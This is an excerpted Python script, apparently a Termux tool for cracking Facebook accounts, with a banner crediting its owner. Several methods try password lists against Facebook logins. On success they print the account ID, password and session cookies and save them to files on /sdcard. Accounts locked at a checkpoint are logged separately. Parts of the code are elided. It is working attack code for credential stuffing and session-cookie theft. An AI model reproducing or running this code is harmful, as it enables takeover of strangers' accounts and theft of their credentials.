...
\33[1;37m--------------------------------------------------
 Owner      :  Arish Ahmed Tushar 
 Facebook   :  Arish Ahmed Tushar 
 Github     :  https://github.com/Termux-Ma
\33[1;37m--------------------------------------------------""")
def clear():
	os.system('clear')
	print(logo)
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f'\r\r\x1b[1;92m [TUSHARL-OK] {rid} | {ps} \n \033[1;37mCookie : {cookie}\033[1;97m')
                    oks.append(rid)
                    open('/sdcard/TUSHAR-OK.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f'\r\r\x1b[1;91m [TUSHAR-CP] {rid} | {ps}\033[1;97m')
                     cps.append(rid)
                     open('/sdcard/TUSHAR-CP.txt','a').write(rid+'|'+ps+'\n')
                else:
                    continue 
            loop+=1
    ...
    def methodB(self, rid, name, psw):
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rsbhai = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"fh={rsbhai};{ckkk}"
                    print(f'\r\r\x1b[1;92m [TUSHAR-OK] {rid} | {ps}\033[1;97m')
                    oks.append(rid)
                    open('/sdcard/TUSHAR-OK.txt','a').write(rid+'|'+ps+'\n');open('/sdcard/REFAT_iDs_COOKiES_M1.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f'\r\r\x1b[1;91m[TUSHAR-CP] {rid} | {ps}\033[1;97m')
                     cps.append(rid)
    ...
    def method3(self, rid, name, psw):
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rsbhai = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"fh={rsbhai};{ckkk}"
                    print(f'\r\r\x1b[1;92m [TUSHAR-OK] {rid} | {ps} \n \033[1;37mCookie : {cookie}\033[1;97m')
                    oks.append(rid)
                    open('/sdcard/TUSHAR-OK.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m [TUSHAR-OK] '+cid+' | '+ps+'\033[1;32m')
				open('TUSHAR.RNDM-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m [TUSHAR-CP] '+cid+' | '+ps+'\33[0;97m')
				open('TUSHAR.RNDM-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue 
